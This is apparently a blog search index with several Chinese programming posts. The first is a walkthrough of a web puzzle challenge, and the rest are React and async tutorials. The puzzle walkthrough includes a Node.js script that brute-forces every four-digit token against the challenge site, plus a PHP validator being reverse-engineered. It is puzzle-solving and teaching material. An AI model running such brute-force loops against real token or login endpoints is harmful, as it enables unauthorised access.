'H' ], [ 'H', 'I' ], [ 'J', 'K' ], [ 'K', 'L' ], [ 'M', 'N' ], [ 'N', 'O' ], [ 'P', 'Q' ], [ 'Q', 'R' ], [ 'S', 'T' ], [ 'T', 'U' ], [ 'V', 'W' ], [ 'W', 'X' ], [ 'Y', 'Z' ], [ 'Z', '[' ], [ '\\\\', ']' ], [ ']', '^' ], [ '_', '`' ], [ '`', 'a' ], [ 'b', 'c' ], [ 'c', 'd' ], [ 'e', 'f' ], [ 'f', 'g' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'k', 'l' ], [ 'l', 'm' ], [ 'n', 'o' ], [ 'o', 'p' ], [ 'q', 'r' ], [ 'r', 's' ], [ 't', 'u' ], [ 'u', 'v' ], [ 'w', 'x' ], [ 'x', 'y' ], [ 'z', '{' ], [ '{', '|' ], [ '}', '~' ] ], // 5 的倍數 [ [ '\"', '#' ], [ '#', '$' ], [ \"'\", '(' ], [ '(', ')' ], [ ',', '-' ], [ '-', '.' ], [ '1', '2' ], [ '2', '3' ], [ '6', '7' ], [ '7', '8' ], [ ';', '&lt;' ], [ '&lt;', '=' ], [ '@', 'A' ], [ 'A', 'B' ], [ 'E', 'F' ], [ 'F', 'G' ], [ 'J', 'K' ], [ 'K', 'L' ], [ 'O', 'P' ], [ 'P', 'Q' ], [ 'T', 'U' ], [ 'U', 'V' ], [ 'Y', 'Z' ], [ 'Z', '[' ], [ '^', '_' ], [ '_', '`' ], [ 'c', 'd' ], [ 'd', 'e' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'm', 'n' ], [ 'n', 'o' ], [ 'r', 's' ], [ 's', 't' ], [ 'w', 'x' ], [ 'x', 'y' ], [ '|', '}' ], [ '}', '~' ] ], // 7 的倍數 [ [ '\"', '#' ], [ '#', '$' ], [ ')', '*' ], [ '*', '+' ], [ '0', '1' ], [ '1', '2' ], [ '7', '8' ], [ '8', '9' ], [ '&gt;', '?' ], [ '?', '@' ], [ 'E', 'F' ], [ 'F', 'G' ], [ 'L', 'M' ], [ 'M', 'N' ], [ 'S', 'T' ], [ 'T', 'U' ], [ 'Z', '[' ], [ '[', '\\\\' ], [ 'a', 'b' ], [ 'b', 'c' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'o', 'p' ], [ 'p', 'q' ], [ 'v', 'w' ], [ 'w', 'x' ], [ '}', '~' ] ]] 備註：這邊建議挑英文數字的組合比較不會出錯。 接著兩兩湊對就是答案了，例如：EFEFABMN 關卡十四 https://r30challenge.herokuapp.com/lv14.php?token=5371 這一題要猜四位數字（0000~9999），所以我一開始就暴力解： 1234567891011121314151617181920212223242526// 這段只能在 Node.js 上跑const request = require('request');~async function() { for (let i=0; i&lt;10000; i++) { let query = i; if (query &lt; 10) { // 0001 ~ 0009 query = '000' + query; } else if (query &lt; 100) { // 0010 ~ 0099 query = '00' + query; } else if (query &lt; 1000) { // 0100 ~ 0999 query = '0' + query; } // 顯示目前猜的數字 console.log(query); await new Promise((resolve) =&gt; { request(`https://r30challenge.herokuapp.com/lv14.php?token=${query}` , (err, res, body) =&gt; { console.log(body); resolve(); }) }) }}() 這裡用 Promise 來處理非同步的問題，看不懂話可以參考 Promise 的小技巧。 不過這個 response 的回傳時間明顯怪怪的，像出現 1 3 5 7 的時候會特別慢。所以一樣查了攻略，發現原來是 幾 A 幾 B 猜數字 的小遊戲。話說回來我還真的沒有玩過這種猜數字遊戲 (´-ω-｀) 所以這題的正確解法應該是先找出所有對的數字，在排成對的順序。 關卡十五 https://r30challenge.herokuapp.com/lv15.php?token=ssGAAAAA 這一題要把這個 function 解出來： 123456789101112131415161718192021function isTokenValid($token) { // 幾點 $h = date('H'); // 幾分 $m = date('i'); // 幾點 * 幾分 + 42 $a = $h * $m + 42; // 儲存 token 轉成 ASCII 後的總和 $count = 0; // 從 0~7，代表 token 是 8 個字 for($i = 0; $i &lt; 8; $i++) { // 轉成 ASCII 後要在減 65 $count += ord($token[$i]) - 65; } // 當 $a &lt;= 100 的時這題就無解 if ($count &lt;= 100) { return false; } // token 的總和要是 $a 的因數 return $a % $count === 0;} 這題我想不出暴力解的解法，所以我是用最笨的方法來解： 先算出下一次 $a 的值（比較不用趕時間） 找出 $a 的所有因數 查 ASCII 表湊出因數 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 找出下一次的 $afunction getCode () { $h = date('H'); $m = date('i') + 1; $a = $h * $m + 42; return $a;}// 找因數function getFactors($n) { $result = ''; for($i=101; $i&lt;=$n; $i++) { if ($n % $i === 0) { $result .= ' ' . $i; } } return $result;}// 計算 token 的總和function getCount($token) { $count = 0; for($i = 0; $i &lt; 8; $i++) { $count += ord($token[$i]) - 65; } return $count;}function getASCII() { for ($i=65; $i&lt;=90; $i++) { echo chr($i) . '=' . $i-65 . '&lt;br&gt;'; } echo '&lt;hr&gt;'; for ($i=97; $i&lt;=122; $i++) { echo chr($i) . '=' . $i-65 . '&lt;br&gt;'; }}// 下一次的 A$nextA = getCode();echo '下一次的 $a = ' . date('H') . ' x ' . date('i') + 1 . ' + ' . '42' . ' = ' . $nextA . '&lt;br&gt;';echo '所有 $a 的因數：' . getFactors($nextA) . '&lt;br&gt;';echo 'token 的 ASCII 總和：' . getCount('sssBAAAA') . '&lt;br&gt;';echo '是不是正確的 token：';var_dump(isTokenValid('sssBAAAA'));echo '&lt;hr&gt;';getASCII();echo '&lt;hr&gt;';echo date('H-i'); 下面只是為了讓 output 比較好讀才寫那一長串： 總之，就是查到對為止就破關了。","link":"/2022/02/11/r30-challenge-record/"},{"title":"理解什麼是 race-condition","text":"很重要的東西！ 舉個例子這兩個 request 都是去讀取書籍的資料，請問輸出結果會是？ 備註：API 來源 12345678910const request = require('request');const API_ENDPOINT = 'https://lidemy-book-store.herokuapp.com';request(`${API_ENDPOINT}/books/1`, (err, res, body) =&gt; { console.log('1', body)})request(`${API_ENDPOINT}/books/2`, (err, res, body) =&gt; { console.log('2', body)}) 雖然你一定會以為是按照順序： 1 =&gt; 2，但實際上並不是這樣子： 為什麼會這樣子？ 1. 因為你不知道 request 實際送到伺服器的時間 有可能第一個先送到，也有可能第二個先送到，這個沒有絕對。 2. 因為你不知道 server 實際上得花多久時間處理你的 request 假設現在真的第一個先送到好了，你也沒辦法確保第一個會處理的比第二個快，因為有可能 server 花了比較多時間處理第一個，所以最後第二個 request 先回來，這也是有可能的。 3. 因為你不知道 sever 傳 response 回來的實際時間。 一樣的意思，sever 傳東西回來也是一個無法預估的時間，所以這個也會影響最後的結果。 這裡也有一個很好的解釋： 12order('一份洋蔥圈')order('一份漢堡') 我先後發送了兩個 order，而餐點送來的順序就會是 洋蔥圈 =&gt; 漢堡 嗎？ 不一定吧！可能會跟廚房做菜的習慣或各種原因都會影響到送餐順序。 所以這個就叫做「race condition」，最後的結果完全憑當下他們競爭的結果，你在事前無法預料結果是什麼。 所以怎麼確保執行順序？拿到第一個 response 後才發出第二個 request： 12345678910const request = require('request');const API_ENDPOINT = 'https://lidemy-book-store.herokuapp.com';// 第一個 request request(`${API_ENDPOINT}/books/1`, (err, res, body) =&gt; { console.log('1', body) // 拿到 response 才後發第二個 request request(`${API_ENDPOINT}/books/2`, (err, res, body) =&gt; { console.log('2', body) })}) 這樣順序就絕對會是 1 =&gt; 2，因為第二個 request 是在第一個 request 處理完後才發出去的。","link":"/2022/01/08/race-condition/"},{"title":"React 關於 render","text":"一開始沒想通的東西，所以記一下。 簡述每當 Component 裡的 state 改變時，React 就會重新把這個 Component render 一遍（render 可以想成是畫面全部擦掉重畫，但實際上只有把改變的地方重畫而已） 不過要強調一下 render 的部分是： 以 component 為單位。 以 component 為單位。 以 component 為單位。 例如說 &lt;App /&gt; 底下有 &lt;Counter /&gt;，這不代表當 &lt;Counter /&gt; 的 state 改變時 &lt;App /&gt; 也會重新 render。會重新 render 的只有 &lt;Counter /&gt;，因為那是它的 state，不是 &lt;App /&gt; 的。 不過如果是 &lt;App /&gt; 被重新 render 的話，那 &lt;Counter /&gt; 也一定會被重新 render，因為它在 &lt;App/&gt; 底下，所以理所當然會被重新 render。 這個兩個差異要多想一下，可能有點抽象，不過還是要分清楚它們的差別。","link":"/2022/04/06/react-about-render/"},{"title":"React 關於 state 的一些概念","text":"簡短但重要。 簡述在 React 裡面更新 state 的方式是透過 setState 來判斷新的跟舊的 state 差別，如果沒有差異的話是不會更新的。 總而言之，你應該要建立一個新的 state 而不是直接去改 state。 另外 useState 回傳的 setState 一般來說是非同步的，所以你沒辦法在 set 完以後就馬上拿到最新的 state： 12345678910111213const handleAddTodo = (content) =&gt; { setTodos([ { id, content, isDone: false, }, ...todos, ]); // 不會是新增以後的 state console.log('todos', todos) id++;}; 只是個簡短的筆記，但這些觀念還蠻重要的，所以還是寫下來吧。","link":"/2022/04/06/react-about-state/"},{"title":"React－關於 useContext 更好的寫法","text":"總會有更好的寫法。 簡述因為自己用到 useContext 的頻率不高，所以在用的時候都用比較正統的方式來撰寫。 到了現在才發現原本有一種更好的寫法，可以把邏輯交給 Context 自己來處理，而不是寫在根元素上。總之這是個蠻不錯的練習，所以想記錄一下。 原本的寫法假設有一個可以自定義主題的 Context，那最正統的寫法會像這樣： 1234567891011import { ThemeContext } from \"../contexts/ThemeContext\"function App () { const [theme, setTheme] = useState('blue') return ( &lt;ThemeContext.Provider value={theme, setTheme}&gt; &lt;Component /&gt; &lt;/ThemeContext.Provider&gt; )} 這樣子寫是沒什麼不對，但有幾個缺點： Context 的邏輯必須跟 App 寫在一起。想想看當 App 有其他邏輯的話，是不是有點混亂？ 延續第一個問題，當有別的 Context 也放在 App 時，就會參雜更多邏輯跟各種 Provider。 基於以上兩點，所以才會有接下來要介紹的寫法，讓你可以把「邏輯封裝在 Context 本身」，而不是混在一起大雜燴。 更好的寫法這種作法就是當我們在建立 Context 時，順便建立一個「專屬 Context 的元件」，聽起來有點莫名，但你看 code 就應該懂了： 1234567891011121314151617// contexts/ThemeContextimport { createContext } from 'react'// 存取 context 時還是得透過他，所以要 export 出去export const ThemeContext = createContext()// 建立一個元件包裝後再 export 出去export function ThemeProvider ({ children }) { const [theme, setTheme] = useState({ color: 'blue' }) return ( &lt;ThemeContext.Provider value={{theme, setTheme}}&gt; {children} &lt;/ThemeContext.Provider&gt; )} 接著 App 的部分就可以改寫成這樣： 123456789import { ThemeProvider } from \"../contexts/ThemeContext\"function App () { return ( &lt;ThemeProvider&gt; &lt;Component /&gt; &lt;/ThemeProvider&gt; )} 應該一眼就能看出這跟原本的差別了吧？現在這個明顯乾淨很多，而且日後要維護的話就只要到對應的 Context 去修改就好，簡直一舉兩得。 不過說穿了我們只是巧妙的運用了 children 來包裝而已，其實跟原本的寫法做的事情一模一樣。 Bonus：使用 custom hook 來減少 boilerplate在存取 Context 的時候，我們多半會這樣寫： 123456789import { useContext } from \"react\"import { ThemeContext } from \"contexts/ThemeContext\"function Component () { const { theme } = useContext(ThemeContext) return ( ... )} 這樣當然沒問題，但就是每次都要 useContext 跟 ThemeContext 有點小麻煩而已。 所以我們可以用 custom hook 來做包裝，像這樣： 1234567891011121314// hooks/useTheme.jsimport { useContext } from \"react\"import { ThemeContext } from \"contexts/ThemeContext\"export const useTheme = () =&gt; { const context = useContext(ThemeContext) // 如果沒在正確的地方使用 Context if (context === undefined) { throw new Error('useTheme() must be used inside a ThemeProvider') } return context} 接著就可以直接拿來用了： 12345678import { useTheme } from \"hooks/useTheme\"function Component () { const { theme } = useTheme() return ( ... )}","link":"/2022/06/19/react-better-way-to-use-context/"},{"title":"React－關於 children 這個 props 的適用時機","text":"希望寫出越來越優雅的 Code。 簡述以前我一直不太知道 children 這個 props 可以用在什麼地方？只覺得他是蠻邊緣的東西。 不過最近在看教學影片時體會到了 children 的妙用之處，所以決定寫一篇簡短的筆記來記錄一下。 Modal一個最簡單的範例就是 Modal。 怎麼說？想想看，一個 modal 的內容有可能是這樣： 也有可能是這樣： 以第一個來說的話他的結構應該會長這樣： 12345678910export default function Modal() { return ( &lt;div className='modal-backdrop'&gt; &lt;div className=\"modal\"&gt; &lt;h2&gt;Some kind of modal title&lt;/h2&gt; &lt;p&gt;Some kind of modal content like so.&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; )} 第二個的話會長這樣： 123456789101112131415export default function Modal() { return ( &lt;div className='modal-backdrop'&gt; &lt;div className=\"modal\"&gt; &lt;h2&gt;Some kind of modal title&lt;/h2&gt; &lt;img className='sample-img' src=\"...\" alt='sample'/&gt; &lt;p&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Ex nostrum delectus et velit recusandae quam eveniet? &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; )} 這個時候就要思考，如果我想讓 Modal 的可重用性發揮到最大的話，該怎麼做比較好？尤其是這種結構可能不太一樣的情況下。 其實就是標題說的，這就是 children 的適用時機。 如果用 props 的話，我沒有辦法同時讓 Modal 支援第一種結構，又支援第二種結構。 可是用 children 的話就不同了，children 有一個最大的特色是可以把 JSX 當作 props 傳給元件。 所以呢，要達到最開始提到的需求的話，可以這樣子寫： 123456789export default function Modal({ children }) { return ( &lt;div className='modal-backdrop'&gt; &lt;div className=\"modal\"&gt; {children} &lt;/div&gt; &lt;/div&gt; )} 接著當我要用 Modal 的時候，只要把內容當作 children 傳進去就搞定了： 123456789&lt;Modal&gt; &lt;h2&gt;Some kind of modal title&lt;/h2&gt; &lt;img className='sample-img' src=\"...\" alt='sample'/&gt; &lt;p&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Ex nostrum delectus et velit recusandae quam eveniet? &lt;/p&gt;&lt;/Modal&gt; 輕輕鬆鬆～","link":"/2022/06/08/react-children-usage/"},{"title":"React 重新複習 class component 的生命週期","text":"再次複習。 簡述之前有寫過一篇：React class component 的生命週期，這篇就當作複習再練習一次。 這篇主要是參考 W3C 官方文件 來做的筆記，會挑 W3C 是因為它寫的比 React 官方文件 簡潔一點，但如果想知道更細節的話還是建議看 React 的官方文件會更完整。 正題首先會分成三個階段： Mounting Updating Ummounting 再貼一次這個好用的圖： Mounting 階段執行順序： constructor() getDerivedStateFromProps() render() componentDidmount constructor附註：只會執行一次 第一個會被先執行到的 function，會接收 props（來自 React.Component）這個參數，除此之外也會在這裡建立 state 的初始值。 順便做個補充，為了確保新建立的 Component 能夠正確運作，一定要記得先 super(props) 繼承所有 React.Component 的東西， getDerivedStateFromProps第二個會被執行的 function，會接受 props（從外面接收到的）和 state（在 constructor 建立的）。 這個階段可以根據 props 來更新或添加 state，向是這樣： 123456789101112131415161718192021222324class App extends React.Component { constructor(props) { console.log(\"1. constructor\"); super(props); // 原本是 red this.state = { favoritecolor: \"red\" }; } // 記得它是「static」方法，所以一定要加上前綴 // 會拿到這個元件的 props 跟 state static getDerivedStateFromProps(props, state) { console.log(\"2. getDerivedStateFromProps\"); // 回傳的東西就會變成新的 state return { favoritecolor: props.favcol }; } render() { console.log(\"3. render\"); // 原本是 red，但會被 getDerivedStateFromProps 改成 yello return &lt;h1&gt;My Favorite Color is {this.state.favoritecolor}&lt;/h1&gt;; }}// 傳一個 props 進去ReactDOM.render(&lt;App favcol=\"yello\" /&gt;, document.getElementById(\"root\")); 範例可以到 這裡 參考。 render第三個會被執行的 function，這階段負責把 HTML 變成 DOM。 componentDidmount附註：只會執行一次 附註：如果跟 getDerivedStateFromProps 改的是同一個 state，那最後會套用它的結果。 第四個會被執行的 function，在「把東西放到畫面上以後」才被執行。 123456789101112131415161718192021class App extends React.Component { constructor(props) { console.log(\"1. constructor\"); super(props); // 原本是 red this.state = { favoritecolor: \"red\" }; } componentDidMount() { console.log(\"3. componentDidMount\"); // 一秒後改成綠色 setTimeout(() =&gt; { this.setState({ favoritecolor: \"green\" }); }, 1000); } render() { console.log(\"2. render\"); return &lt;h1&gt;My Favorite Color is {this.state.favoritecolor}&lt;/h1&gt;; }} 範例可以到 這裡 參考。 最後在強調一下，只有 render 跟 getDerivedStateFromProps 會在每次 re-render 的時候會被執行，其他兩個都只有一次，可以到 這裡 參考看看。 Update 階段執行順序： getDerivedStateFromProps() shouldComponentUpdate() render() getSnapshotBeforeUpdate() componentDidUpdate() getDerivedStateFromProps剛剛有說過 re-render 的時候這個會在執行一次，所以這邊它就是第一個會先被執行的 function。 shouldComponentUpdate大概是最常看到的一個 function，總之它是一個蠻重要的 function，可以決定要不要 re-render，端看你給的回傳值是 true / false，另外會接收兩個參數是 nextProps 和 nextState： 12345678910111213141516171819202122232425262728class App extends React.Component { constructor(props) { super(props); this.state = { counter: 0 }; } shouldComponentUpdate(nextProps, nextState) { console.log(\"shouldComponentUpdate\"); console.log(\"props\", nextProps); console.log(\"state\", nextState); return false; } render() { return ( &lt;div&gt; &lt;div&gt;回傳 false，所以不 re-render&lt;/div&gt; &lt;div&gt;Counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={() =&gt; this.setState({ counter: this.state.counter + 1 })} &gt; add &lt;/button&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App ppp=\"yo\" /&gt;, document.getElementById(\"root\")); 範例一樣到 這邊 看。 renderrender 每一次 re-render 都會被執行，所以在這個階段中當然也會。 這邊 render 要做的事情就是把更新 state 後的 HTML 反應 DOM 上面（注意是 DOM 不是畫面），這邊就不示範了。 getSnapshotBeforeUpdate這個取名還真有意思，就是能在這邊拿到「更新前的 state」，所以乾脆來拍張照做紀念好了（？ 這邊搭配 componentDidMount 來做個示範，原本的顏色是 red，但會改成 yellow，而 getSnapshotBeforeUpdate 會把更新前的 state 印到畫面上： 1234567891011121314151617181920212223242526272829303132class App extends React.Component { constructor(props) { super(props); this.state = { favoriteColor: \"red\" }; } componentDidMount() { // 畫面 paint 完一秒後更新 state，觸發 re-render setTimeout(() =&gt; { this.setState({ favoriteColor: \"yellow\" }); }, 1000); } // W3C 是寫說要搭配 componentDidUpdate 來用，否則會出錯 // 但這邊在 codepen 上測試是 OK，所以先這樣寫 getSnapshotBeforeUpdate(prevProps, prevState) { document.getElementById(\"div1\").innerHTML = ` before update state, the favorite color was ${prevState.favoriteColor} `; } render() { return ( &lt;div&gt; &lt;h1&gt;My Favorite Color is {this.state.favoriteColor}&lt;/h1&gt; &lt;div id=\"div1\"&gt;&lt;/div&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\")); 不太懂的話就直接到這裡看 範例 吧。 componentDidUpdate就是「更新完以後」會被執行的 function，這邊沿用剛剛 getSnapshotBeforeUpdate 的範例，看一下應該就知道在幹嘛了： 123456789101112131415161718192021222324252627282930313233343536373839class App extends React.Component { constructor(props) { super(props); this.state = { favoriteColor: \"red\" }; } componentDidMount() { // 畫面 paint 完一秒後更新 state，觸發 re-render setTimeout(() =&gt; { this.setState({ favoriteColor: \"yellow\" }); }, 1000); } // 拿到更新前的值 getSnapshotBeforeUpdate(prevProps, prevState) { document.getElementById(\"div1\").innerHTML = ` before update state, the favorite color was ${prevState.favoriteColor} `; } // 拿到更新後的值 // 因為是更新以後才被執行，所以 this.state 就會是新的 state componentDidUpdate() { document.getElementById(\"div2\").innerHTML = ` after update state, the favorite color is ${this.state.favoriteColor} `; } render() { return ( &lt;div&gt; &lt;h1&gt;My Favorite Color is {this.state.favoriteColor}&lt;/h1&gt; &lt;div id=\"div1\"&gt;&lt;/div&gt; &lt;div id=\"div2\"&gt;&lt;/div&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\")); 一樣附上 範例。 Unmounting 階段簡略來說應該只有這一個：componentWillUnmount componentWillUnmount就是在「元件從畫面上移除前」要做什麼？直接看 範例： 12345678910111213141516171819202122232425262728class Header extends React.Component { componentWillUnmount() { alert(\"Before Header ummount\"); } render() { return &lt;h1&gt;Hello I'm header&lt;/h1&gt;; }}class App extends React.Component { constructor(props) { super(props); this.state = { show: true }; } render() { return ( &lt;div&gt; {this.state.show &amp;&amp; &lt;Header /&gt;} &lt;button onClick={() =&gt; this.setState({ show: !this.state.show })}&gt; Toggle header &lt;/button&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\"));","link":"/2022/04/21/react-class-life-cycle-review/"},{"title":"React class component 的生命週期","text":"又是生命週期～ 生命週期一個 component 的生命週期主要能分成三個階段： Mount Update Unmount 另外先提醒一下，等一下介紹的 method 都會自動綁定 this 值（因為是 React 幫你呼叫這些 method 的），所以不用像寫 handler 那樣要自己綁定。 Mount 階段在 Mount 主要會經歷這幾段： 執行 constructor 初始化 static getDerivedStateFromProps 會在 render 前觸發，但不用管這個 componentWillMount，mount 以前，但不推薦使用，也應該快被廢棄了。 render 執行 render method componentDidMount，mount 之後，適合在這個階段打 API 123456789101112131415161718192021222324252627class Demo extends React.Component { constructor(props) { console.log(\"constructor\"); super(props); this.state = { counter: 0, }; } // 不推薦使用 componentWillMount() { console.log(\"before mount\"); } componentDidMount() { console.log(\"after mount\"); } render() { console.log(\"render\"); return ( &lt;div&gt; &lt;div&gt;counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={this.handleClick}&gt;+1&lt;/button&gt; &lt;/div&gt; ); }} Update 階段在 Update 主要會經歷這幾段： shouldComponentUpdate 在 update 之前，可以在這裡決定要不要更新 component（回傳 true 或 false） componentWillUpdate 在確定會更新後，真的更新東西以前（也是會廢棄的東西，知道一下就好） render，執行 render method componentDidUpdate 已經更新完東西了，這邊會順便給你更新前的 props 和 state 接下來這個示範是每次 update 以前會先用 shouldComponentUpdate 檢查，確認更新後的值是否 &lt; 5，符合的話才進行更新 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Demo extends React.Component { constructor(props) { console.log(\"constructor\"); super(props); // 只能是 Object this.state = { counter: 0, }; } componentWillUpdate() { console.log(\"before update\"); } // 會給你上一次的 props 和 state componentDidUpdate(prevProps, prevState) { console.log(\"after update\"); console.log(\"prevState\", prevState); } // return true ? 更新 : 不更新 // 會提供更新後的 props 跟 state shouldComponentUpdate(nextProps, nextState) { console.log(\"shouldComponentUpdate\"); // 小於 5 才更新 return nextState.counter &lt; 5; } handleClick = () =&gt; { this.setState({ counter: this.state.counter + 1, }); }; render() { console.log(\"render\"); return ( &lt;div&gt; &lt;div&gt;counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={this.handleClick}&gt;+1&lt;/button&gt; &lt;/div&gt; ); }} UnMount 階段這個就相對簡單一些，就是在元件要被從畫面上移除之前可以用 componentWillUnmount 來做事情。 這個示範是當 counter &lt; 1 的時候才顯示 TestText 元件，所以當不符合時 TestText 就會被移除掉，觸發 componentWillUnmount： 1234567891011121314151617181920212223242526272829303132333435363738394041class TestText extends React.Component { componentDidMount() { console.log(\"TestText after mount\"); } // unmount 以前 componentWillUnmount() { console.log(\"TestText before unmount\"); } render() { return &lt;div&gt;yoyoyo&lt;/div&gt;; }}class Demo extends React.Component { constructor(props) { console.log(\"constructor\"); super(props); this.state = { counter: 0, }; } handleClick = () =&gt; { this.setState({ counter: this.state.counter + 1, }); }; render() { console.log(\"render\"); return ( &lt;div&gt; &lt;div&gt;counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={this.handleClick}&gt;+1&lt;/button&gt; {this.state.counter &lt; 1 &amp;&amp; &lt;TestText /&gt;} &lt;/div&gt; ); }} 以上就是基本的生命週期，只要知道在每個階段都會有對應的 method 可以使用就差不多了。 PureComponent最後補充一下 PureComponent 這東西。 前面有介紹可以用 shouldComponentUpdate 來決定要不要觸發 Component 的更新，但如果要自己寫好像蠻麻煩的？ 因此 React 有提供 PureComponent，只要在創造 Component 時用它，它就會自動幫你設定 shouldComponentUpdate，只有在 props 改變時才觸發更新（跟 hook 的 memo 差不多） 1234class Demo extends React.PureComponent { // 每當 props 改變時才更新 ...}","link":"/2022/04/08/react-class-life-cycle/"},{"title":"React－這個 fetch 我剛剛要但現在又不要了","text":"有夠任性。 簡述這篇其實是要介紹兩個東西： clean function（useEffect） 的適用時機 AbortController 說真得我還蠻少用到這兩樣東西的，所以想記錄一下。 範例假設有一個 Component 的內容是透過 useEffect 來從 API 取得資料的。那麼「如果我在 fetch 的期間就把 Component unmount 的話」，會發生什麼事？ 這邊先看一段 code，會比較好懂這是什麼意思： 123456789101112131415import Button from \"Button\";import { useState } from \"react\";import TripList from \"TripList\";export default function App() { // 控制 List 是否顯示的 state const [showTripList, setShowTripList] = useState(true) return ( &lt;div\"&gt; &lt;h2&gt;Trip List&lt;/h2&gt; &lt;button onClick={() =&gt; setShowTripList(false)}&gt;Cancel fetching&lt;/button&gt; {showTripList &amp;&amp; &lt;TripList /&gt;} &lt;/div&gt; );} 這邊不用管 &lt;TripList /&gt; 是什麼，只要知道他會用 useEffect 來打 API 拿資料就好。 至於 &lt;Button&gt; 的作用是把 &lt;TripList /&gt; 從畫面上移除，也就是前面說的 unmount。 所以現在的情況是，如果我在 &lt;TripList /&gt; 還在 fetch 的期間就按下 &lt;Button /&gt; 的話，會發生什麼事？ 沒意外的話你應該會得到這個訊息： Warning: Can’t perfrom a React state update on an unmounted component. This is a no-op, ….. 附註：後來的 React 似乎有做一點調整，所以不會看到這個訊息。 他的意思是說，「我現在要更新 state，但那個 Component 已經不存在了，安捏嘎丟？」 我們可以先思考一下整個流程，就會比較清楚為什麼會是這種結果了： 一開始 showTripList 為 true，所以會渲染 &lt;TripList /&gt; &lt;TripList /&gt; 開始 fetch 資料 按下 &lt;Button /&gt; 把 &lt;TripList /&gt; 從畫面上移除掉（unmount） fetch 回來了，更新原本用來儲存資料的 state 發現 Component 不存在，所以顯示 Warning 這邊理解後，就可以繼續往下思考該怎麼解決了。 要怎麼在元件 unmount 的時候把 fetch 取消？這個是最核心的問題，所以才刻意用標題來醒目。不過我其實在一開始就有先洩漏了，就是透過 clean function 跟 AbortController 來實現。 要 trigger clean function 的方式很簡單，就是「在 useEffect 裡面回傳一個 function」，像這樣： 12345678useEffect(() =&gt; { ... ... ... // clean function () =&gt; {...}}, []) 而要取消 fetch 的方式就是用 AbortController 來做連結。 直接來看範例吧： 1234567891011121314151617181920212223242526272829303132333435363738394041import { useEffect, useState } from \"react\";const API = \"https://reqres.in/api/users?page=1\";const sleep = (ms) =&gt; new Promise((resolve) =&gt; setTimeout(() =&gt; resolve(), ms));export default function TripList() { const [data, setData] = useState([]); const [isPending, setIsPending] = useState(false); const [error, setError] = useState(null); useEffect(() =&gt; { // 建立 instance const controller = new AbortController(); const fetchData = async () =&gt; { setIsPending(true); setError(null); try { await sleep(1000); // 用 signal 把 fetch 和 controller 串連起來 const response = await fetch(API, { signal: controller.signal }); if (!response.ok) throw new Error(response.statusText); const json = await response.json(); setData(json.data); } catch (err) { // For developer console.log(\"👉 Exception message: \", err.message); // 在 AbortError 時不要更新 state err.name === \"AbortError\" ? console.log(\"User abort the fetch\") : setError(\"Can not fetch the data\"); } finally { setIsPending(false); } }; fetchData(); // unmount 時就執行這個 clean function return () =&gt; controller.abort(); }, []); return ...;} 改成這樣以後，如果在 fetch 的狀態下點了 &lt;Button /&gt;，就會把 &lt;TripList /&gt; 給移除掉，執行 () =&gt; controller.abort() 把 fetch 給取消掉。 取消的同時會拋出一個 AbortError 的 Exception，所以會進到 cache 區塊。但要注意，請務必記得多做一層「是不是 AbortError」的判斷，為什麼？ 因為我們就是希望 Abort 的情況下不要更新 state，所以才要檢查 Error 的型別，把它跟一般的錯誤處理區別開來。 總而言之，如果還是似懂非懂的話，可以到我寫的 範例 來試試看。希望之後能善用這項技術寫出更好的 code。","link":"/2022/06/11/react-clean-function/"},{"title":"React 之 Component 基礎","text":"不要想的太複雜。 把東西傳給 Component：props123456789101112// 接收到 props 參數function Person (props) { return &lt;div&gt;{props.name} | {props.age} | {props.gender}&lt;/div&gt;}ReactDOM.render( &lt;React.StrictMode&gt; // 傳進去 Component &lt;Person name=\"Peanu\" age=\"20\" gender=\"man\"/&gt; &lt;/React.StrictMode&gt;, document.getElementById('root')); 在 Component 裡面塞東西：children12345678910111213141516171819function Person (props) { return ( &lt;div&gt; // 用 children 接收 {props.children} &lt;br /&gt; {props.name} | {props.age} | {props.gender} &lt;/div&gt; )}ReactDOM.render( &lt;React.StrictMode&gt; &lt;Person name=\"Peanu\" age=\"20\" gender=\"man\"&gt; // 夾在裡面 Hello &lt;/Person&gt; &lt;/React.StrictMode&gt;, document.getElementById('root')); 如果想寫成 &lt;Component /&gt; 的格式也行： 12345678910function Person ({ children }) { return &lt;div&gt;{children}&lt;/div&gt;}ReactDOM.render( &lt;React.StrictMode&gt; &lt;Person children=\"helloooo\" /&gt; &lt;/React.StrictMode&gt;, document.getElementById('root'));","link":"/2022/04/05/react-component-basic/"},{"title":"React－用 portal 把元件移到我想要的位置","text":"頗邊緣的 Method。 簡述就如標題所說的，有時候我們可能會想調整元件在 HTM Ｌ中的位置。 舉例來說，假設我們有一個 App，裡面有 Modal 這個元件，那在 HTML 中就會這樣呈現： Modal 會放在 App 裡面，合情合理。 不過有沒有辦法把他變成這樣子？ 像這樣子把 Modal 放到 body 的最後面。 還真的有，就是用 ReactDOM 的 createPortal 來實現： 12345678910111213141516import React from 'react'import ReactDOM from 'react-dom'export default function Modal({ children, setModal }) { return ReactDOM.createPortal( &lt;div className='modal-backdrop'&gt; &lt;div className='modal'&gt; {children} &lt;button className='btn' onClick={() =&gt; setModal(false)}&gt; Close &lt;/button&gt; &lt;/div&gt; &lt;/div&gt;, document.body )} 第一個參數放 JXS，第二個參數則是放你想要的 DOM 元素，以這個例子來說我選擇的是 body 這個元素。 只要改用這種方式後就能自行決定元件的渲染位置囉。","link":"/2022/06/09/react-create-portal/"},{"title":"React－CSS Module","text":"什麼都要來點 module。 簡述在 React 裡寫 style 除了 inline-style、className 和 CSS-In-JS 以外，還有一種寫法叫做 CSS 